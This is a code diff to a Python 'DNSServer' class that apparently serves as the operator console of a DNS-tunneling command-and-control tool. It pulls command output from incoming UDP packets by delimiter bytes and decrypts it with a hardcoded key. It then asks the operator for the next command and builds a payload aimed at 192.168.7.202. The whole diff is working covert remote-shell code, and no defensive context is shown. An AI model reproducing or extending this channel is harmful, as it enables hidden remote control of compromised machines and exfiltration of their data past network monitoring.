@@ -1,6 +1,7 @@
 from datetime import datetime
 import socket
 import base64
+from dataEncryptor import dataEncryptor
 from payload import Payload
 
 class DNSServer:
@@ -16,27 +17,32 @@ class DNSServer:
         while 1:
             req, address = sock.recvfrom(512) #start listening
             printWithTime("UDP", f"Received {len(req)} bytes from {address}")
-            print(req)
             if commandRan:
                 dataList = list(req)
                 newDataList = list()
                 found = False
                 count = 0
                 for i in dataList:
-                    if i == 47:
+                    if i == 33:
                         found = True
                         count += 1
                         if count == 2:
                             break
                     elif found:
                         newDataList.append(i)
-                bytesnewDataList = bytearray(newDataList)
-                hex2 = bytesnewDataList.decode("ascii")
-                b = bytes.fromhex(hex2).decode("ascii")
-                base64_bytes = b.encode('ascii')
-                message_bytes = base64.b64decode(base64_bytes)
-                commandOutput = message_bytes.decode('ascii') 
-                print("Output of " + command + ":" + commandOutput)       
+                bytesNewDataList = bytearray(newDataList)
+                d = dataEncryptor()
+                output = d.decrypting(bytesNewDataList, "hellothisismebob")
+                output = output.decode('utf-8')
+                output2 = ""
+                for i in repr(output):
+                    if i == "'":
+                        continue
+                    elif i == "\\":
+                        break
+                    else:
+                        output2 += i 
+                print("Output of " + command + ":" + output2)       
                 commandRan = False
             command = input("Enter a command:")
             p = Payload("192.168.7.202")
